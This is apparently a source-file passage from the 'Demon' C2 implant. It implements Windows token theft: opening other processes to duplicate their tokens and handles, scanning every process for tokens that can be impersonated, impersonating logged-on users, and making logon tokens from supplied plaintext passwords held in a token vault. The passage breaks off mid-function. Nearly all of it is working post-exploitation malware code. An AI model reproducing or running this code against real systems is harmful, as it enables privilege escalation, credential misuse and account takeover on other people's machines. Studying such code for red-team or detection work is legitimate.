#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Token.h>
#include <Core/Win32.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>

#include <ntstatus.h>

/* TODO: Change the way new tokens gets added.
 *
 * Instead of appending it to the newest token like:
 * TokenNew->Next = Token
 *
 * Add it to the first token (parent):
 *
 * Token->Next            = Instance.Tokens.Vault;
 * Instance.Tokens.Vault = Token;
 *
 * Might reduce some code which i care more than
 * token order.
 * */

/*!
 * @brief
 *  Duplicate given token
 *
 * @param TokenOriginal
 * @param Access
 * @param ImpersonateLevel
 * @param TokenType
 * @param TokenNew
 * @return
 */
BOOL TokenDuplicate(
    IN  HANDLE        TokenOriginal,
    IN  DWORD         Access,
    IN  SEC_IMP_LEVEL ImpersonateLevel,
    IN  TOKEN_TYPE    TokenType,
    OUT PHANDLE       TokenNew
) {
    OBJECT_ATTRIBUTES   ObjAttr  = { 0 };
    SEC_QUALITY_SERVICE Sqos     = { 0 };
    NTSTATUS            NtStatus = STATUS_SUCCESS;

    Sqos.Length              = sizeof( SEC_QUALITY_SERVICE );
    Sqos.ImpersonationLevel  = ImpersonateLevel;
    Sqos.ContextTrackingMode = 0;
    Sqos.EffectiveOnly       = FALSE;

    /* Initialize Object Attributes */
    InitializeObjectAttributes( &ObjAttr, NULL, 0, NULL, NULL );

    ObjAttr.SecurityQualityOfService = &Sqos;

    /* duplicate token using native call */
    if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateToken( TokenOriginal, Access, &ObjAttr, FALSE, TokenType, TokenNew ) ) ) {
        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        return FALSE;
    }

    return TRUE;
}

/*!
 * @brief
 *  reverse to the original process user token
 *
 * @return if successful reverse to original token
 */
BOOL TokenRevSelf(
    VOID
) {
    HANDLE   Token    = NULL;
    NTSTATUS NtStatus = STATUS_SUCCESS;

    if ( ! NT_SUCCESS( NtStatus = SysNtSetInformationThread( NtCurrentThread(), ThreadImpersonationToken, &Token, sizeof( HANDLE ) ) ) ) {
        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        return FALSE;
    }

    return TRUE;
}



/*!
 * @brief
 *  queries the username and or domain
 *
 * @note
 *  the queried memory should be freed after used
 *  using HeapFree/RtlFreeHeap
 *
 * @param Token
 * @param UserDomain
 * @param Flags
 * @return
 */
BOOL TokenQueryOwner(
    IN  HANDLE  Token,
    OUT PBUFFER UserDomain,
    IN  DWORD   Flags
) {
    NTSTATUS     NtStatus = STATUS_SUCCESS;
    BOOL         Success  = FALSE;
    PTOKEN_USER  UserInfo = NULL;
    ULONG        UserSize = 0;
    PVOID        Domain   = NULL;
    PVOID        User     = NULL;
    DWORD        UserLen  = { 0 };
    DWORD        DomnLen  = { 0 };
    SID_NAME_USE SidType  = 0;

    /* check if we specified the required args */
    if ( ! Token || ! UserDomain ) {
        return FALSE;
    }

    /* get the size for the TOKEN_USER struct */
    if ( ! NT_SUCCESS( NtStatus = SysNtQueryInformationToken( Token, TokenUser, UserInfo, 0, &UserSize ) ) )
    {
        UserInfo = NtHeapAlloc( UserSize );

        /* query the token user (we need the sid) */
        if ( ! NT_SUCCESS( NtStatus = SysNtQueryInformationToken( Token, TokenUser, UserInfo, UserSize, &UserSize ) ) ) {
            goto LEAVE;
        }

        /* now get the Username and Domain from the Sid */
        if ( ! Instance.Win32.LookupAccountSidW( NULL, UserInfo->User.Sid, NULL, &UserLen, NULL, &DomnLen, &SidType ) )
        {
            SidType = 0;

            if ( Flags == TOKEN_OWNER_FLAG_USER ) {
                UserDomain->Length = ( UserLen * sizeof( WCHAR ) );
            } else if ( Flags == TOKEN_OWNER_FLAG_DOMAIN ) {
                UserDomain->Length = ( DomnLen * sizeof( WCHAR ) );
            } else {
                UserDomain->Length = ( UserLen * sizeof( WCHAR ) ) + ( DomnLen * sizeof( WCHAR ) );
            }

            /* we allocate one buffer for specified owner flag */
            UserDomain->Buffer = NtHeapAlloc( UserDomain->Length );

            PRINTF( "UserDomain: %p : %d\n", UserDomain->Buffer, UserDomain->Length );

            Domain = UserDomain->Buffer;
            User   = ( UserDomain->Buffer + ( DomnLen * sizeof( WCHAR ) ) );

            /* setup arguments */
            if ( Flags == TOKEN_OWNER_FLAG_USER ) {
                Domain = NtHeapAlloc( DomnLen * sizeof( WCHAR ) );
                User   = UserDomain->Buffer;
            } else if ( Flags == TOKEN_OWNER_FLAG_DOMAIN ) {
                User   = NtHeapAlloc( UserLen * sizeof( WCHAR ) );
            }

            /* now lets try to get the owner */
            if ( ! Instance.Win32.LookupAccountSidW( NULL, UserInfo->User.Sid, User, &UserLen, Domain, &DomnLen, &SidType ) ) {
                PRINTF( "LookupAccountSidW Error => %d\n", NtGetLastError() );
                goto LEAVE;
            }

            /* now let's add the \ between the Username and Domain */
            if ( Flags == TOKEN_OWNER_FLAG_DEFAULT ) {
                B_PTR( UserDomain->Buffer )[ ( DomnLen * sizeof( WCHAR ) ) ] = '\\';
            }

            /* if we reached til this point means we were pretty much successful */
            Success = TRUE;
        } else {
            PUTS( "Unexpected successful call to LookupAccountSidW.\n" )
        }
    } else {
        PUTS( "Unexpected successful call to NtQueryInformationToken.\n" )
    }

LEAVE:
    if ( UserInfo ) {
        DATA_FREE( UserInfo, UserSize )
    }

    if ( Flags == TOKEN_OWNER_FLAG_USER ) {
        DATA_FREE( Domain, DomnLen );
    } else if ( Flags == TOKEN_OWNER_FLAG_DOMAIN ) {
        DATA_FREE( User, UserLen );
    }

    return Success;
}

/*!
 * sets a privilege
 *
 * TODO: change it to use wide strings.
 *
 * @param Privilege
 * @param Enable
 * @return
 */
BOOL TokenSetPrivilege(
    IN LPSTR Privilege,
    IN BOOL  Enable
) {
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };
    LUID             TokenLUID       = { 0 };
    NTSTATUS         NtStatus        = STATUS_SUCCESS;
    HANDLE           hToken          = NULL;

    if ( ! Instance.Win32.LookupPrivilegeValueA( NULL, Privilege, &TokenLUID ) ) {
        PRINTF( "[-] LookupPrivilegeValue error: %u\n", NtGetLastError() );
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount       = 1;
    TokenPrivileges.Privileges[ 0 ].Luid = TokenLUID;

    if ( Enable ) {
        TokenPrivileges.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
    } else {
        TokenPrivileges.Privileges[ 0 ].Attributes = 0;
    }

    if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( NtCurrentProcess( ), TOKEN_ALL_ACCESS, &hToken ) ) ) {
        if ( ! Instance.Win32.AdjustTokenPrivileges( hToken, FALSE, &TokenPrivileges, 0, NULL, NULL ) ) {
            PRINTF( "[-] AdjustTokenPrivileges error: %u\n", NtGetLastError() );
            return FALSE;
        }
    } else {
        PRINTF( "NtOpenProcessToken: Failed [%d]", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
        PACKAGE_ERROR_NTSTATUS( NtStatus )
        return FALSE;
    }

    return TRUE;
}

/*!
 * Adds an token to the vault.
 *
 * TODO:
 *  rewrite the function param. accept token object + STOLEN PID or MAKE data as a struct.
 *
 * @param hToken
 * @param DomainUser
 * @param Type
 * @param dwProcessID
 * @param User
 * @param Domain
 * @param Password
 * @return
 */
DWORD TokenAdd(
    IN HANDLE hToken,
    IN LPWSTR DomainUser,
    IN SHORT  Type,
    IN DWORD  dwProcessID,
    IN LPWSTR User,
    IN LPWSTR Domain,
    IN LPWSTR Password
) {
    PTOKEN_LIST_DATA TokenList   = NULL;
    PTOKEN_LIST_DATA TokenEntry  = NULL;
    DWORD            TokenIndex  = 0;

    TokenEntry              = Instance.Win32.LocalAlloc( LPTR, sizeof( TOKEN_LIST_DATA ) );
    TokenEntry->Handle      = hToken;
    TokenEntry->DomainUser  = DomainUser;
    TokenEntry->dwProcessID = dwProcessID;
    TokenEntry->Type        = Type;
    TokenEntry->lpUser      = User;
    TokenEntry->lpDomain    = Domain;
    TokenEntry->lpPassword  = Password;
    TokenEntry->NextToken   = NULL;

    if ( Instance.Tokens.Vault == NULL ) {
        Instance.Tokens.Vault = TokenEntry;
        return TokenIndex;
    }

    TokenList = Instance.Tokens.Vault;

    /* add TokenEntry to Token linked list */
    while ( TokenList->NextToken != NULL ) {
        TokenList = TokenList->NextToken;
        TokenIndex++;
    }

    TokenList->NextToken = TokenEntry;
    TokenIndex++;

    return TokenIndex;
}

/*!
 * Steals the process token from the specified pid
 * @param ProcessID
 * @param TargetHandle
 * @return
 */
HANDLE TokenSteal(
    IN DWORD  ProcessID,
    IN HANDLE TargetHandle
) {
    HANDLE            hProcess  = NULL;
    HANDLE            hToken    = NULL;
    HANDLE            hTokenDup = NULL;
    NTSTATUS          NtStatus  = STATUS_SUCCESS;
    CLIENT_ID         ProcID    = { 0 };
    OBJECT_ATTRIBUTES ObjAttr   = { sizeof( ObjAttr ) };

    if ( TargetHandle )
    {
        PRINTF( "Stealing handle 0x%x from PID %d\n", TargetHandle, ProcessID );
        ProcID.UniqueProcess = ( HANDLE ) ProcessID;
        NtStatus = SysNtOpenProcess( &hProcess, PROCESS_DUP_HANDLE, &ObjAttr, &ProcID );
        if ( NT_SUCCESS( NtStatus ) )
        {
            NtStatus = SysNtDuplicateObject( hProcess, TargetHandle, NtCurrentProcess( ), &hTokenDup, 0, 0, DUPLICATE_SAME_ACCESS );
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PRINTF( "NtDuplicateObject: Failed:[%ld : %ld]", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            }
        }
        else
        {
            PRINTF( "NtOpenProcess: Failed:[%ld : %ld]", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        }
    }
    else
    {
        PRINTF( "Stealing process handle from PID %d\n", ProcessID );
        hProcess = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
        if ( hProcess )
        {
            if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken ) ) )
            {
                if ( ! TokenDuplicate(
                    hToken,
                    TOKEN_ADJUST_DEFAULT  | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
                    SecurityImpersonation | SecurityIdentification,
                    TokenPrimary,
                    &hTokenDup
                ) ) {
                    PRINTF( "[!] DuplicateTokenEx() error : % u\n", NtGetLastError()) ;
                    PACKAGE_ERROR_WIN32
                }
                else PRINTF( "Successful duplicated token: %x\n", hToken )
            } else {
                PRINTF( "NtOpenProcessToken: Failed:[%p : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
                PACKAGE_ERROR_NTSTATUS( NtStatus )
            }
        } else {
            PRINTF( "ProcessOpen: Failed:[%ld]\n", NtGetLastError() )
            PACKAGE_ERROR_WIN32
        }
    }

    if ( hToken ) {
        SysNtClose( hToken );
    }

    if ( hProcess ) {
        SysNtClose( hProcess );
    }

    return hTokenDup;
}

BOOL TokenRemove( DWORD TokenID )
{
    PRINTF( "Token Remove => %d\n", TokenID )

    PTOKEN_LIST_DATA TokenList  = NULL;
    PTOKEN_LIST_DATA TokenItem  = NULL;

    TokenItem = TokenGet( TokenID );
    TokenList = Instance.Tokens.Vault;

    if ( ( ! TokenList ) || ( ! TokenItem ) )
        return FALSE;

    if ( Instance.Tokens.Vault == TokenItem )
    {
        PUTS( "Its first item" )
        TokenItem = Instance.Tokens.Vault->NextToken;

        if ( Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == Instance.Tokens.Vault->Handle )
            TokenImpersonate( FALSE );

        if ( Instance.Tokens.Vault->Handle )
        {
            SysNtClose( Instance.Tokens.Vault->Handle );
            Instance.Tokens.Vault->Handle = NULL;
        }

        if ( Instance.Tokens.Vault->DomainUser )
        {
            MemSet( Instance.Tokens.Vault->DomainUser, 0, StringLengthW( Instance.Tokens.Vault->DomainUser ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->DomainUser );
            Instance.Tokens.Vault->DomainUser = NULL;
        }

        if ( Instance.Tokens.Vault->lpUser )
        {
            MemSet( Instance.Tokens.Vault->lpUser, 0, StringLengthW( Instance.Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpUser );
            Instance.Tokens.Vault->lpUser = NULL;
        }

        if ( Instance.Tokens.Vault->lpDomain )
        {
            MemSet( Instance.Tokens.Vault->lpDomain, 0, StringLengthW( Instance.Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpDomain );
            Instance.Tokens.Vault->lpDomain = NULL;
        }

        if ( Instance.Tokens.Vault->lpPassword )
        {
            MemSet( Instance.Tokens.Vault->lpPassword, 0, StringLengthW( Instance.Tokens.Vault->lpPassword ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpPassword );
            Instance.Tokens.Vault->lpPassword = NULL;
        }

        MemSet( Instance.Tokens.Vault, 0, sizeof( TOKEN_LIST_DATA ) );
        Instance.Win32.LocalFree( Instance.Tokens.Vault );

        Instance.Tokens.Vault = TokenItem;

        return TRUE;
    }

    do
    {
        if ( TokenList )
        {
            if ( TokenList->NextToken == TokenItem )
            {
                PUTS( "Found TokenItem" )

                TokenList->NextToken = TokenItem->NextToken;

                if ( Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == TokenItem->Handle )
                    TokenImpersonate( FALSE );

                if ( TokenItem->Handle )
                {
                    SysNtClose( TokenItem->Handle );
                    TokenItem->Handle = NULL;
                }

                if ( TokenItem->DomainUser )
                {
                    MemSet( TokenItem->DomainUser, 0, StringLengthW( TokenItem->DomainUser ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->DomainUser );
                    TokenItem->DomainUser = NULL;
                }

                if ( TokenItem->lpUser )
                {
                    MemSet( TokenItem->lpUser, 0, StringLengthW( TokenItem->lpUser ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->lpUser );
                    TokenItem->lpUser = NULL;
                }

                if ( TokenItem->lpDomain )
                {
                    MemSet( TokenItem->lpDomain, 0, StringLengthW( TokenItem->lpUser ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->lpDomain );
                    TokenItem->lpDomain = NULL;
                }

                if ( TokenItem->lpPassword )
                {
                    MemSet( TokenItem->lpPassword, 0, StringLengthW( TokenItem->lpPassword ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->lpPassword );
                    TokenItem->lpPassword = NULL;
                }

                MemSet( TokenItem, 0, sizeof( TOKEN_LIST_DATA ) );
                Instance.Win32.LocalFree( TokenItem );
                TokenItem = NULL;

                return TRUE;
            }
            else
                TokenList = TokenList->NextToken;
        }
        else
            return FALSE;
    } while ( TRUE );
}

HANDLE TokenMake( LPWSTR User, LPWSTR Password, LPWSTR Domain )
{
    HANDLE hToken = NULL;

    PRINTF( "TokenMake( %ls, %ls, %ls )\n", User, Password, Domain )

    if ( ! TokenRevSelf() )
    {
        PRINTF( "Failed to revert to self: Error:[%d]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32
        // TODO: at this point should I return NULL or just continue ? For now i just continue.
    }

    if ( ! Instance.Win32.LogonUserW( User, Domain, Password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
    {
        PUTS( "LogonUserW: Failed" )
        PACKAGE_ERROR_WIN32
    }

    return hToken;
}

/*!
 * get current process/thread token
 * @return
 */
HANDLE TokenCurrentHandle(
    VOID
) {
    HANDLE Token = NULL;

    /* TODO: use native calls */
    if ( ! Instance.Win32.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, FALSE, &Token ) )
    {
        PRINTF( "OpenThreadToken: Failed:[%d]\n", NtGetLastError() );
        if ( ! Instance.Win32.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, TRUE, &Token ) )
        {
            PRINTF( "OpenThreadToken: Failed:[%d]\n", NtGetLastError() );
            if ( ! Instance.Win32.OpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &Token ) )
            {
                PRINTF( "OpenProcessToken: Failed:[%d]\n", NtGetLastError() );
                return NULL;
            }
        }
    }

    return Token;
}

BOOL TokenElevated(
    IN HANDLE Token
) {
    TOKEN_ELEVATION Data  = { 0 };
    DWORD           Size  = sizeof( TOKEN_ELEVATION );
    BOOL            Admin = FALSE;

    if ( NT_SUCCESS( SysNtQueryInformationToken( Token, TokenElevation, &Data, Size, &Size ) ) ) {
        Admin = U_PTR( Data.TokenIsElevated );
    }

    return Admin;
}

PTOKEN_LIST_DATA TokenGet(
    IN DWORD TokenID
) {
    PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
    DWORD            TokenIndex = 0;

    for ( TokenIndex = 0; TokenIndex < TokenID && TokenList && TokenList->NextToken; ++TokenIndex ) {
        TokenList = TokenList->NextToken;
    }

    if ( TokenIndex != TokenID ) {
        return NULL;
    }

    return TokenList;
}

VOID TokenClear(
    VOID
) {
    PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
    DWORD            TokenIndex = 0;

    TokenImpersonate( FALSE );

    do {
        if ( TokenList != NULL ) {
            TokenList = TokenList->NextToken;
        } else {
            break;
        }
        TokenIndex++;
    } while ( TRUE );

    for ( int i = 0; i < TokenIndex; i++ ) {
        TokenRemove( 0 );
    }

    Instance.Tokens.Impersonate = FALSE;
    Instance.Tokens.Vault       = NULL;
    Instance.Tokens.Token       = NULL;
}

BOOL TokenImpersonate(
    IN BOOL Impersonate
) {
    if ( Impersonate && ! Instance.Tokens.Impersonate && Instance.Tokens.Token )
    {
        // impersonate the current token.
        if ( Instance.Win32.ImpersonateLoggedOnUser( Instance.Tokens.Token->Handle ) ) {
            Instance.Tokens.Impersonate = TRUE;
        } else {
            Instance.Tokens.Impersonate = FALSE;
        }

        return Instance.Tokens.Impersonate;
    }
    else if ( ! Impersonate && Instance.Tokens.Impersonate ) {
        return TokenRevSelf(); // stop impersonating
    } else if ( Impersonate && ! Instance.Tokens.Token ) {
        return TRUE; // there is no token to impersonate in the first place
    } else if ( Impersonate && Instance.Tokens.Impersonate ) {
        return TRUE; // we are already impersonating
    } else if ( ! Impersonate && ! Instance.Tokens.Impersonate ) {
        return TRUE; // we are already not impersonating
    }

    return FALSE;
}

LPWSTR GetObjectInfo(
    IN HANDLE                   hObject,
    IN OBJECT_INFORMATION_CLASS objInfoClass
) {
    LPWSTR                   data        = NULL;
    DWORD                    dwSize      = sizeof( OBJECT_NAME_INFORMATION );
    POBJECT_NAME_INFORMATION pObjectInfo = NULL;
    NTSTATUS                 status      = STATUS_SUCCESS;

    pObjectInfo = Instance.Win32.LocalAlloc( LPTR, dwSize );
    status      = SysNtQueryObject( hObject, objInfoClass, pObjectInfo, dwSize, &dwSize );
    do {
        Instance.Win32.LocalFree( pObjectInfo );
        pObjectInfo = Instance.Win32.LocalAlloc( LPTR, dwSize );
        status = SysNtQueryObject( hObject, objInfoClass, pObjectInfo, dwSize, &dwSize );
    } while ( status == STATUS_INFO_LENGTH_MISMATCH );

    if ( NT_SUCCESS (status) )
    {
        data = Instance.Win32.LocalAlloc( LPTR, pObjectInfo->Name.Length * sizeof( WCHAR ) );
        MemCopy( data, pObjectInfo->Name.Buffer, pObjectInfo->Name.Length * sizeof( WCHAR ) );
        Instance.Win32.LocalFree( pObjectInfo );
        return data;
    }

    Instance.Win32.LocalFree( pObjectInfo );

    return NULL;
}

BOOL IsDelegationToken( HANDLE token )
{
    HANDLE temp_token              = NULL;
    BOOL   ReturnValue             = FALSE;
    LPVOID TokenImpersonationInfo  = NULL;
    DWORD  returned_tokinfo_length = 0;

    TokenImpersonationInfo = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE );
    if ( ! TokenImpersonationInfo ) {
        return FALSE;
    }

    if ( Instance.Win32.GetTokenInformation( token, TokenImpersonationLevel, TokenImpersonationInfo, BUF_SIZE, &returned_tokinfo_length ) )
    {
        if ( *( ( SECURITY_IMPERSONATION_LEVEL* ) TokenImpersonationInfo ) >= SecurityDelegation ) {
            ReturnValue = TRUE;
        } else {
            ReturnValue = FALSE;
        }
    } else {
        ReturnValue = TokenDuplicate( token, TOKEN_ALL_ACCESS, SecurityDelegation, TokenImpersonation, &temp_token );
        SysNtClose( temp_token );
    }

    if ( TokenImpersonationInfo ) {
        Instance.Win32.LocalFree( TokenImpersonationInfo );
    }

    return ReturnValue;
}

BOOL IsImpersonationToken( HANDLE token )
{
    HANDLE temp_token              = NULL;
    BOOL   ReturnValue             = FALSE;
    LPVOID TokenImpersonationInfo  = NULL;
    DWORD  returned_tokinfo_length = 0;

    TokenImpersonationInfo = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE );
    if ( ! TokenImpersonationInfo ) {
        return FALSE;
    }

    if ( Instance.Win32.GetTokenInformation( token, TokenImpersonationLevel, TokenImpersonationInfo, BUF_SIZE, &returned_tokinfo_length ) ) {
        if ( *( ( SECURITY_IMPERSONATION_LEVEL* ) TokenImpersonationInfo ) >= SecurityImpersonation ) {
            ReturnValue = TRUE;
        } else {
            ReturnValue = FALSE;
        }
    } else {
        ReturnValue = TokenDuplicate( token, TOKEN_ALL_ACCESS, SecurityImpersonation, TokenImpersonation, &temp_token );
        SysNtClose( temp_token );
    }

    if ( TokenImpersonationInfo ) {
        Instance.Win32.LocalFree( TokenImpersonationInfo );
    }

    return ReturnValue;
}

/* TODO: use TokenQueryOwner */
BOOL GetDomainUsernameFromToken(
    IN  HANDLE token,
    OUT PCHAR  FullName
) {
    LPVOID TokenUserInfo           = NULL;
    LPSTR  username                = NULL;
    LPSTR  domainname              = NULL;
    DWORD  user_length             = BUF_SIZE * sizeof( CHAR );
    DWORD  domain_length           = BUF_SIZE * sizeof( CHAR );
    DWORD  sid_type                = 0;
    DWORD  returned_tokinfo_length = 0;
    BOOL   ReturnValue             = FALSE;

    TokenUserInfo = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE * sizeof(LPVOID) );
    if ( ! TokenUserInfo ) {
        goto Cleanup;
    }

    username = Instance.Win32.LocalAlloc( LPTR, user_length );
    if ( ! username ) {
        goto Cleanup;
    }

    domainname = Instance.Win32.LocalAlloc( LPTR, domain_length );
    if ( ! domainname ) {
        goto Cleanup;
    }

    if ( ! Instance.Win32.GetTokenInformation( token, TokenUser, TokenUserInfo, BUF_SIZE, &returned_tokinfo_length ) ) {
        goto Cleanup;
    }

    if ( ! Instance.Win32.LookupAccountSidA( NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username, &user_length, domainname, &domain_length, (PSID_NAME_USE)&sid_type ) ) {
        goto Cleanup;
    }

    // Make full name in DOMAIN\USERNAME format
    StringCopyA( FullName, domainname );
    StringConcatA( FullName, "\\" );
    StringConcatA( FullName, username );

    ReturnValue = TRUE;

Cleanup:
    if ( TokenUserInfo ) {
        Instance.Win32.LocalFree( TokenUserInfo );
    }

    if ( username ) {
        Instance.Win32.LocalFree( username );
    }

    if ( domainname ) {
        Instance.Win32.LocalFree( domainname );
    }

    return ReturnValue;
}

VOID ProcessUserToken(
    IN OUT PSavedToken      SavedToken,
    IN OUT PUniqueUserToken UniqTokens,
    IN OUT PDWORD           NumUniqTokens
) {
    BOOL user_exists = FALSE;

    for ( DWORD i = 0; i < *NumUniqTokens; ++i )
    {
        if ( ! StringCompareA( UniqTokens[i].username, SavedToken->username) )
        {
            if ( UniqTokens[i].localHandle != 0 && SavedToken->localHandle != 0 )
            {
                user_exists = TRUE;
                break;
            }
            if ( UniqTokens[i].localHandle == 0 && SavedToken->localHandle == 0 )
            {
                user_exists = TRUE;
                break;
            }
        }
    }

    if ( ! user_exists )
    {
        // TODO: while unlikely, this could overflow

        StringCopyA( UniqTokens[ *NumUniqTokens ].username, SavedToken->username );
        UniqTokens[ *NumUniqTokens ].dwProcessID = SavedToken->dwProcessID;
        UniqTokens[ *NumUniqTokens ].localHandle = SavedToken->localHandle;
        UniqTokens[ *NumUniqTokens ].delegation_available    = FALSE;
        UniqTokens[ *NumUniqTokens ].impersonation_available = FALSE;

        if ( IsDelegationToken( SavedToken->token ) ) {
            UniqTokens[ *NumUniqTokens ].delegation_available = TRUE;
        } else if ( IsImpersonationToken( SavedToken->token ) ) {
            UniqTokens[ *NumUniqTokens ].impersonation_available = TRUE;
        }

        (*NumUniqTokens)++;
    }
}

BOOL ListTokens( PUniqueUserToken* pUniqTokens, PDWORD pNumTokens )
{
    BOOL                        ReturnValue       = FALSE;
    DWORD                       NumTokens         = 0;
    DWORD                       ListSize          = BUF_SIZE;
    PSavedToken                 TokenList         = NULL;
    NTSTATUS                    status            = STATUS_SUCCESS;
    PSYSTEM_PROCESS_INFORMATION pProcessInfoList  = NULL;
    PSYSTEM_PROCESS_INFORMATION pProcessInfoEntry = NULL;
    DWORD                       dwSize            = sizeof(SYSTEM_HANDLE_INFORMATION);
    BOOL                        MoreProcesses     = TRUE;
    HANDLE                      hProcess          = NULL;
    HANDLE                      hObject           = NULL;
    HANDLE                      hObject2          = NULL;
    CLIENT_ID                   ProcID            = { 0 };
    OBJECT_ATTRIBUTES           ObjAttr           = { sizeof( ObjAttr ) };
    LPWSTR                      lpwsType          = NULL;
    PUniqueUserToken            UniqTokens        = NULL;
    DWORD                       NumUniqTokens     = 0;

    UniqTokens = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE * sizeof( UniqueUserToken ) );
    if ( ! UniqTokens )
        goto Cleanup;

    TokenList = Instance.Win32.LocalAlloc( LPTR, ListSize * sizeof( SavedToken ) );
    if ( ! TokenList )
        goto Cleanup;
    
    // we don't care if we don't actually get to enable this privilege
    TokenSetPrivilege( SE_IMPERSONATE_NAME, TRUE );

    pProcessInfoList = Instance.Win32.LocalAlloc( LPTR, dwSize );
    if ( ! pProcessInfoList )
        goto Cleanup;
    
    status = SysNtQuerySystemInformation( SystemProcessInformation, pProcessInfoList, dwSize, &dwSize );

    while (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        Instance.Win32.LocalFree( pProcessInfoList );
        pProcessInfoList = Instance.Win32.LocalAlloc( LPTR, dwSize );
        if ( ! pProcessInfoList )
            goto Cleanup;
        status = SysNtQuerySystemInformation(SystemProcessInformation, pProcessInfoList, dwSize, &dwSize);
    }

    if ( ! NT_SUCCESS( status ) )
        goto Cleanup;

    pProcessInfoEntry = pProcessInfoList;

    while ( MoreProcesses )
    {
        if ( pProcessInfoEntry->NextEntryOffset == 0 )
        {
            MoreProcesses = FALSE;
        }

        // ignore our own process
        if ( pProcessInfoEntry->UniqueProcessId != Instance.Teb->ClientId.UniqueProcess )
        {
            ProcID.UniqueProcess = pProcessInfoEntry->UniqueProcessId;
            status = SysNtOpenProcess( &hProcess, PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, &ObjAttr, &ProcID );
            if ( NT_SUCCESS( status ) )
            {
                for ( ULONG i = 0; i < pProcessInfoEntry->HandleCount; i++ )
                {
                    hObject = NULL;

                    if ( Instance.Win32.DuplicateHandle( hProcess, (HANDLE)(DWORD_PTR)((i + 1) * 4), NtCurrentProcess(), &hObject, 0, FALSE, DUPLICATE_SAME_ACCESS ) )
                    {
                        lpwsType = GetObjectInfo(hObject, ObjectTypeInformation);
                        if ( lpwsType )
                        {
                            if ( lpwsType[0] == 'T' && lpwsType[1] == 'o' && lpwsType[2] == 'k' && lpwsType[3] == 'e' && lpwsType[4] == 'n' && Instance.Win32.ImpersonateLoggedOnUser( hObject ) )
                            {
                                // ImpersonateLoggedOnUser() always returns true. Need to check whether impersonated token kept impersonate status - failure degrades to identification
                                // also revert to self after getting new token context
                                // only process if it was impersonation or higher
                                if ( Instance.Win32.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, TRUE, &hObject2 ) )
                                {
                                    TokenRevSelf();

                                    if ( IsImpersonationToken( hObject2 ) )
                                    {
                                        // Reallocate space if necessary
                                        if ( NumTokens >= ListSize )
                                        {
                                            ListSize *= 2;
                                            TokenList = Instance.Win32.LocalReAlloc(
                                                    TokenList,
                                                    ListSize * sizeof( SavedToken ),
                                                    LMEM_MOVEABLE
                                            );
                                            if ( ! TokenList )
                                                goto Cleanup;
                                        }

                                        if ( GetDomainUsernameFromToken( hObject, TokenList[ NumTokens ].username ) )
                                        {
                                            TokenList[ NumTokens ].token = hObject;
                                            TokenList[ NumTokens ].dwProcessID = ( DWORD ) ( ULONG_PTR ) pProcessInfoEntry->UniqueProcessId;
                                            TokenList[ NumTokens ].localHandle = ( HANDLE ) ( ( i + 1 ) * 4 );
                                            ProcessUserToken( &TokenList[ NumTokens ], UniqTokens, &NumUniqTokens );
                                            NumTokens++;
                                        }
                                        else
                                        {
                                            PUTS("Failed to obtain the username and domain")
                                        }
                                    }
                                    SysNtClose( hObject2 ); hObject2 = NULL;
                                }
                                else
                                {
                                    TokenRevSelf();
                                }
                            }
                            Instance.Win32.LocalFree( lpwsType ); lpwsType = NULL;
                        }
                        else
                        {
                            SysNtClose( hObject ); hObject = NULL;
                        }
                    }
                }

                // Also process primary
                status = SysNtOpenProcessToken( hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hObject );
                if ( NT_SUCCESS( status ) )
                {
                    if ( Instance.Win32.ImpersonateLoggedOnUser( hObject ) )
                    {
